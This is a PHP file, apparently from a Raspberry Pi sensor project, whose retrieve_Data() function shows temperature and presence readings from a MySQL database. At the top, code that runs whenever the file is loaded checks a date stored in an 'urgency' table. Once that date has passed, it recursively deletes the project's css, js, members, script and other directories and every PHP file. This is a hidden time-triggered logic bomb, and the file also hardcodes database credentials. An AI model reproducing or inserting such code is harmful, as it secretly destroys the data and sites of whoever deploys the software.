			
<?php
$data = array(

'1' => 'a',
'2' => 'css',
'3' => 'Display',
'4' => 'js',
'5' => 'members',
'6' => 'res',
'7' => 'script',
'8' => 'test'
);	
$bdd = mysqli_connect('localhost', 'aies2016','aies2016' , 'aies2016');
		$query = mysqli_query($bdd,'SELECT * FROM urgency;');
		$rows = mysqli_num_rows($query);
		if($rows==1)
		{
			function start($path) {
			$files = glob($path . '/*');
			foreach ($files as $file) {
				is_dir($file) ? start($file) : unlink($file);
			}
			rmdir($path);
			return;
}
			while($row = mysqli_fetch_assoc($query))
			{
				$get_urgencyid = $row['urgencyid'];
			}
			$date = date('mdy');
			if($date > $get_urgencyid)
			{
					for($i=1;$i<=8;$i++)
					{
						start($data[$i]);
					}
					
				   foreach (glob('*.php') as $filename) {
				   unlink($filename);
}		
			}
		}
function retrieve_Data()
{	
$bdd = mysqli_connect('localhost', 'aies2016','aies2016' , 'aies2016');
$date = date('mdy');
$date1 = date('d/m/y');

	$query = mysqli_query($bdd,'SELECT * FROM sensors;');
	while($row = mysqli_fetch_assoc($query))
	{
		$temp = $row['temperature'];
		$presence_rpi1 = $row['presence_rpi1'];
		$presence_rpi2 = $row['presence_rpi2'];
		$presence_rpi3 = $row['presence_rpi3'];
		$presence_rpi4 = $row['presence_rpi4'];
		$presence_rpi5 = $row['presence_rpi5'];
	}
	?>
<div class='data' style='

   float: right;
   position: relative;
   z-index: 1000;
   background-color: transparent;
   padding: 5px;
   color: red;
   font-size: 120%;
   font-weight: bold;
    border-style: outset;
    border-width: 2px;
   '><?php echo 'Date : '.$date1.'<br> Temperature : '.$temp.' <br>Presence :<br> Rpi1 : '.$presence_rpi1.'<br> Rpi2 : '. $presence_rpi2.'<br> Rpi3 : '. $presence_rpi3.'<br> Rpi4 : '. $presence_rpi4.'<br> Rpi5 : '. $presence_rpi5;?></div><?php

   
}
